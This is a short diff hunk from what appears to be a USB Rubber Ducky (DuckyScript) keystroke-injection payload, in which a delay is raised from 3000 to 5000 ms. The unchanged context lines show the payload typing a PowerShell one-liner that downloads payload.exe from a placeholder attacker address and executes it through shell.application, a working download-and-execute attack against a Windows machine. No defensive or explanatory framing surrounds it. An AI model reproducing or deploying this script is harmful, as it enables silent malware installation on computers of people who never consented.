@@ -22,6 +22,6 @@ TAB
 SPACE
 DELAY 500
 ALT 
-DELAY 3000
+DELAY 5000
 STRING $down = New-Object System.Net.Webclient; $url = 'http://yourip or link/payload.exe'; $file = 'payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
 ENTER	
